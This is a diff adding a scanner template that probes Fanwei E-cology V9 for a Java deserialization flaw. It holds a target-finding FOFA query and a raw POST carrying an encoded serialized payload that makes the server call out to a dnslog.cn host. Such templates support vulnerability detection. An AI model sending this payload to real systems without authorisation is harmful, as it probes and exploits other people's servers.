@@ -1,0 +1,29 @@
+id: fanwei-e-cology-v9-Unserialize
+
+info:
+  name: Fanwei E-cology V9 Unserialize
+  author: zp857
+  severity: high
+  reference: https://moresec.yuque.com/iixlqz/wnv3e6/muc8pk
+  tags: fanwei-e-cology,unserialize
+  metadata:
+    fofa-query: 'body="泛微协同" || body="wev8" || body="ecology" || body="e-cology" || body="wui/index.html" || header="ecology_JSessionId"'
+
+requests:
+  - raw:
+      - |
+        POST /synccache.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        data=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa/ORyAwAHSQAIaGFzaENvZGVJAARwb3J0TAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgADTAAEaG9zdHEAfgADTAAIcHJvdG9jb2xxAH4AA0wAA3JlZnEAfgADeHD//////////3QAEGNnMHd0by5kbnNsb2cuY250AABxAH4ABXQABGh0dHBweHQAF2h0dHA6Ly9jZzB3dG8uZG5zbG9nLmNueA==
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "Exception"
